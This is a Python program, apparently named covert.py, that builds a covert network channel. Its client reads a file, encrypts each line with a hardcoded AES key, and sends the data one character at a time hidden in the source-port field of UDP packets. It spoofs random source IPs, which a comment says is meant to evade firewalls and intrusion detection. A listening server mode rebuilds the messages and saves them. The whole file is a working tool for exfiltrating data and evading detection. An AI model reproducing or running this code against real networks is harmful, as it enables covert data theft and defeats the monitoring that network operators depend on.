import getopt
import sys
from scapy.layers.inet import UDP, IP
from typing import Tuple
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.volatile import RandIP
from scapy.all import sniff, send

# ADDRESS & PORT are only modified in process_args()
ADDRESS = "127.0.0.1"
PORT = 8080

# Hardcoded key for encrypting/decrypting msg
# Not secure, but this is a prototype application using random text so its ok
key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'

# Global var which stores packets from data, resets when "|" received
hex_data = ""

def main(mode, file):
    """Enables client/server mode based on cmd line args"""
    mode_str = "SERVER" if mode else "CLIENT"
    if mode:
        server_config(mode_str)
        sniff(filter="udp", prn=lambda p: server(p, file), store=False)
    else:
        client_config(mode_str)
        client(file)

def client_config(mode_str):
    """Displays client settings"""
    print("-----CONFIG-----")
    print(f"MODE: {mode_str}")
    print(f"FILE: {file}")
    print(f"ADDRESS: {ADDRESS}")
    print(f"PORT: {PORT}")
    print("----------------")


def server_config(mode_str):
    """Displays server settings"""
    print("-----CONFIG-----")
    print(f"MODE: {mode_str}")
    print(f"FILE: {file}")
    print(f"PORT: {PORT}")
    print("----------------")


def server(packet, file):
    """Filters packets based on type and port to determine
       if it should be processed or not"""
    if UDP in packet and packet[UDP].dport == PORT:
        parse_packet(packet[UDP].sport, file)


def parse_packet(data, file):
    """Processes ascii data in source port field"""
    global hex_data
    # If delimiter received (Ascii of | -> 124, decrypt message)
    if data == 124:
        decrypt_msg(file)
        return
    # Convert ascii to character
    hex_byte = get_char(data)
    # Add to hex string
    hex_data += hex_byte

def reset_hex():
    """Message has been decrypted, reset hex_data
    to empty string for future messages"""
    global hex_data
    hex_data = ""


def decrypt_msg(file):
    """Decrypts hex string"""
    print("Received entire message..... combining pieces\n")
    encrypted_string = bytes.fromhex(hex_data)
    reset_hex()
    print(f"Combined byte stream of encrypted message: {encrypted_string}")
    cipher = generate_cipher()
    # Initialize a decryptor object
    decryptor = cipher.decryptor()
    # Initialize an unpadder object
    unpadder = padding.PKCS7(128).unpadder()
    # Decrypt and remove padding
    padded_message = decryptor.update(encrypted_string) + decryptor.finalize()
    msg = unpadder.update(padded_message) + unpadder.finalize()
    msg = msg.decode()
    print(f"Decrypted message: {msg}\n")
    # save to file
    save_msg(msg, file)


def save_msg(msg, file):
    """Saves message to file"""
    with open(file, 'a+') as file:
        file.write(msg + '\n')
    print("Message written to file")
    print("--------------------------------")

def client(file):
    """Process each line of input file in
    preparation for sending"""
    lines = []
    with open(file, 'r') as f:
        while True:
            line = f.readline()
            if not line: break
            lines.append(line.strip())
    for line in lines:
        # Generate cipher and encrypt line
        cipher = generate_cipher()
        encrypted_line = encrypt_line(cipher, line)
        print(f"Sending: {line}")
        print(f"Encrypted format: {encrypted_line}")
        print("--------------------------------------------------------------")
        # Convert byte stream of encrypted line to hex string
        hex_str = get_hex_string(encrypted_line)
        for item in hex_str:
            # for each char in hex string,
            # get ascii code and generate packet
            ascii_data = get_ascii(item)
            generate_packet(ascii_data)
        # Send terminator to signal end of str
        terminator = get_ascii("|")
        generate_packet(terminator)

def get_hex_string(encrypted_line):
    """ Returns hex string of byte stream (encrypted string)"""
    return encrypted_line.hex()


def generate_cipher() -> Cipher:
    """Generates cipher for encryption"""
    return Cipher(algorithms.AES(key), modes.CBC(iv))


def encrypt_line(cipher, line) -> bytes:
    """Encrypts message"""
    encryptor = cipher.encryptor()
    # Padding needed at AES requires specific byte size.
    # Allows for custom length messages.
    padder = padding.PKCS7(128).padder()
    padded_line = padder.update(line.encode()) + padder.finalize()
    encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
    return encrypted_line


def generate_packet(data):
    """Creates UDP packet with data hidden in source port field"""
    # Set random source IP to prevent firewall/ids detection
    # from blocking this machine
    src_ip = RandIP()
    ip = IP(src=src_ip, dst=ADDRESS)
    udp = UDP(sport=data, dport=PORT)
    payload = "******"
    pkt = ip/udp/payload
    send(pkt, verbose=0)


def get_ascii(hex_char) -> int:
    """Returns ascii code of char"""
    return ord(hex_char)

def get_char(ascii):
    """Gets char from ascii code"""
    return chr(ascii)


def usage():
    """Outputs instructions"""
    txt = """\nWelcome! Usage instructions can be seen below."""
    print(txt)
    print("-------------------------------------------")
    print("usage: python covert.py [options]")
    print("\t-h  --help   show usage")


def process_args(argv) -> Tuple[bool, str]:
    """Processes arguments"""
    global ADDRESS
    global PORT
    SERVER_MODE = False
    try:
        opts, args = getopt.getopt(argv, "h", ["help", "server", "ip=", "port=", "file="])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err)  # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o == "--server":
            SERVER_MODE = True
        elif o == "--ip":
            ADDRESS = a
        elif o == "--port":
            PORT = int(a)
        elif o == "--file":
            file = a
        else:
            assert False, "Unhandled option"
    return SERVER_MODE, file


if __name__ == "__main__":
    mode, file = process_args(sys.argv[1:])
    main(mode, file)
